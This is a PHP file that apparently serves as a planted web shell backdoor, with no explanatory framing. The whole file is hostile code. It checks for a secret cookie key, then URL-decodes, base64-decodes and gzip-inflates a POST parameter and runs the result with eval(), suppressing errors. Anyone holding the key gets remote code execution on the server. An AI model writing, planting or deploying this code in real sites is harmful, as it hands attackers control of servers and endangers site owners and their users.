<?php
if(!empty($_COOKIE['__mestore']) and substr($_COOKIE['__mestore'],0,16)=='3469825000034634'){if (!empty($_POST['message']) and $message=@gzinflate(@base64_decode(@str_replace(' ','',urldecode($_POST['message']))))){echo '<textarea id=areatext>';eval($message);echo '</textarea>bg';exit;}} exit;
